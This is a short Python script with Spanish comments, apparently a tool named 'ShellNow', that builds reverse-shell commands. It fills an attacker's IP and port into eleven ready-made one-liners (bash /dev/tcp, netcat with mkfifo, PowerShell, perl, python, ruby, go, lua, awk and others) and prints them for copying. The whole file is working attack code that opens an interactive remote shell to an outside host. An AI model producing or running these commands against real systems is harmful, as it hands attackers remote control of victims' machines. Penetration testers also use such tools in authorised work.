#!/usr/bin/env python3
import sys

# Secuencia de colores para la terminal (Linux)
R = "\033[1;31m"	#Rojo
G = "\033[1;32m"	#Verde
B = "\033[1m"		#Negrita
W = "\033[1;37m"	#Blanco
N = "\033[0m"		#Cancelar secuencia de colores

shells = {'bash':"bash -c 'exec bash -i &>/dev/tcp/%s/%s <&1'",
		  'zsh':"zsh -c 'zmodload zsh/net/tcp && ztcp %s %s && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
		  'nc':"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f",
		  'php':"php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
		  'powershell':"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
		  'perl':"perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
		  'python':"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
		  'ruby':"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
		  'go':"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
		  'lua':"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
		  'awk':"awk 'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
		}

def banner():
	print (W + '''
	╔═╗┬ ┬┌─┐┬  ┬  ┌┐┌┌─┐┬ ┬
	╚═╗├─┤├┤ │  │  ││││ ││││
	╚═╝┴ ┴└─┘┴─┘┴─┘┘└┘└─┘└┴┘ v0.1
	''' + N + R + "\n\t  [ Get Your Shell ] \n" + N)

def main(ip, port, shell):
	try:
		if shell == "all":
			print ( W + "\n[+] All the shells\n" + N)

			for list_shell in shells: 
				print (G + list_shell + N + " -> " + W + shells[list_shell] % (ip, port) + N)
		else:	
			print (G + "\n[i] Copy this:\n" + N)
			print ( W +shells[shell] % (ip, port) + "\n" + N)

	except KeyError:
		print (R + "\n[!] Error choice a shell\n" + N)

if __name__ == '__main__':
	if len(sys.argv) < 4:
		banner()
		print (G + "USAGE:"+ W + " {} <ip> <port> <shell>".format(sys.argv[0]) + N)
		print (G + "\nSHELL:\n" + N)

		for list_sh in shells:
			print (W + "[ "+ list_sh + " ]" + N)

	else:
		main(sys.argv[1], sys.argv[2], sys.argv[3])


